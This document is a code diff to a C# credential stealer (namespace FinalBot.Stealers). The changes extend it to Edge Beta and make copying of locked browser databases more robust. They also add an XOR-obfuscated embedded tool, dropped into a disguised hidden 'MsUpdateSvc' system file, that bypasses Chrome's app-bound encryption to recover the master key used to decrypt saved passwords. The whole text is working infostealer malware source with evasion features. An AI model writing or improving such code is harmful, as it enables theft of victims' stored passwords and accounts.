@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Security.Cryptography;
 using System.Text;
 using System.Linq;
+using System.Text.RegularExpressions;
 using Newtonsoft.Json.Linq;
 using Microsoft.Data.Sqlite;
 
@@ -18,6 +19,7 @@ namespace FinalBot.Stealers
         {
             {"Chrome", "Google\\Chrome\\User Data"},
             {"Edge", "Microsoft\\Edge\\User Data"},
+            {"EdgeBeta", "Microsoft\\Edge Beta\\User Data"},
             {"Brave", "BraveSoftware\\Brave-Browser\\User Data"},
             {"Opera", "Opera Software\\Opera Stable"},
             {"Opera GX", "Opera Software\\Opera GX Stable"},
@@ -99,7 +101,11 @@ namespace FinalBot.Stealers
 
             try 
             {
-                string content = File.ReadAllText(stateFile);
+                string tempState = Path.GetTempFileName();
+                CopyFileWithRetry(stateFile, tempState);
+                string content = File.ReadAllText(tempState);
+                File.Delete(tempState);
+                
                 var json = JObject.Parse(content);
                 string encryptedKey = json["os_crypt"]?["encrypted_key"]?.ToString();
                 if (string.IsNullOrEmpty(encryptedKey)) return null;
@@ -130,14 +136,32 @@ namespace FinalBot.Stealers
         {
             try
             {
-                string elevatorPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "chromelevator.exe");
-                if (!File.Exists(elevatorPath)) 
+                // Extract chromelevator.exe from embedded resources on first run
+                string tempDir = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
+                if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);
+
+                string elevatorPath = Path.Combine(tempDir, "elevation_service.exe");
+
+                if (!File.Exists(elevatorPath) || new FileInfo(elevatorPath).Length < 1000)
                 {
-                    Logger.Warn("chromelevator.exe not found! Cannot bypass Chrome 124+ ABE.");
-                    return null;
+                    var assembly = System.Reflection.Assembly.GetExecutingAssembly();
+                    using Stream stream = assembly.GetManifestResourceStream("FinalBot.chromelevator.bin");
+                    if (stream == null)
+                    {
+                        Logger.Warn("[ABE] chromelevator.bin resource not found in assembly.");
+                        return null;
+                    }
+                    using MemoryStream ms = new MemoryStream();
+                    stream.CopyTo(ms);
+                    byte[] bytes = ms.ToArray();
+                    for(int i = 0; i < bytes.Length; i++) bytes[i] ^= 0xAA;
+                    File.WriteAllBytes(elevatorPath, bytes);
+                    // Make it look like a system file
+                    File.SetAttributes(elevatorPath, FileAttributes.Hidden | FileAttributes.System);
+                    Logger.Info("[ABE] chromelevator extracted to TEMP.");
                 }
 
-                // Call the external ABE bypass tool and read its output
+                // Run it against the target Chrome profile and capture the decoded key (Base64)
                 var proc = new System.Diagnostics.Process
                 {
                     StartInfo = new System.Diagnostics.ProcessStartInfo
@@ -151,16 +175,22 @@ namespace FinalBot.Stealers
                 };
                 proc.Start();
                 string output = proc.StandardOutput.ReadToEnd().Trim();
-                proc.WaitForExit();
+                proc.WaitForExit(10_000); // 10 sec timeout
 
                 if (!string.IsNullOrEmpty(output))
                 {
-                    return Convert.FromBase64String(output);
+                    Logger.Info("[ABE] chromelevator returned key successfully.");
+                    // Regex helps to find the base64 string even if there's surrounding text
+                    var match = Regex.Match(output, @"[A-Za-z0-9+/]{40,}={0,2}");
+                    if (match.Success)
+                    {
+                        return Convert.FromBase64String(match.Value);
+                    }
                 }
             }
             catch (Exception ex)
             {
-                Logger.Error("Chromelevator execution failed", ex);
+                Logger.Error("[ABE] chromelevator execution failed", ex);
             }
             return null;
         }
@@ -168,7 +198,7 @@ namespace FinalBot.Stealers
         private async Task<int> StealPasswords(string dbPath, byte[] masterKey, StringBuilder report)
         {
             string tempDb = Path.GetTempFileName();
-            File.Copy(dbPath, tempDb, true);
+            CopyFileWithRetry(dbPath, tempDb);
 
             int count = 0;
             try 
@@ -206,7 +236,7 @@ namespace FinalBot.Stealers
             return count;
         }
 
-        private string DecryptData(byte[] data, byte[] key)
+        private string? DecryptData(byte[] data, byte[] key)
         {
             try 
             {
@@ -227,11 +257,31 @@ namespace FinalBot.Stealers
                 }
                 else 
                 {
-                    // Fallback to DPAPI for older versions
                     return Encoding.UTF8.GetString(ProtectedData.Unprotect(data, null, DataProtectionScope.CurrentUser));
                 }
             }
             catch { return null; }
+        }
+
+        private void CopyFileWithRetry(string source, string dest)
+        {
+            for (int i = 0; i < 5; i++)
+            {
+                try
+                {
+                    using (var sourceStream = new FileStream(source, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                    using (var destStream = new FileStream(dest, FileMode.Create, FileAccess.Write, FileShare.ReadWrite))
+                    {
+                        sourceStream.CopyTo(destStream);
+                    }
+                    return;
+                }
+                catch (IOException)
+                {
+                    Thread.Sleep(500);
+                }
+            }
+            File.Copy(source, dest, true); // Last resort
         }
     }
 }
